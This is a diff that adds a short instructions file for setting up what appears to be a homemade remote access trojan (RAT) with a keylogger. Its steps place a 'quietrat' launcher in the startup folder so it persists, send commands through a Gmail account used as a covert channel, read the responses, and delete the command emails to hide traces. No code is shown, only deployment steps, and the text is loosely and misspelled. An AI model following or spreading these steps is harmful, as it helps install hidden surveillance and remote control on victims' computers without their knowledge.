@@ -1,0 +1,19 @@
+instructions:
+1.Open keyler robinsiner to give inp commands
+
+2.open kyle robinson in order to recieve the output of the command  
+
+3. move this into desktop
+
+4.change dir in runrat to the location of RAT.py
+
+5.change dir of quietrat to location of runrat
+
+6.place quietrat into startup folder (see keylogger)
+
+7.to pass command go to the gmail(See RAT_acc) 
+
+8.see response on kyle robinson 
+
+9.delete the input email 
+
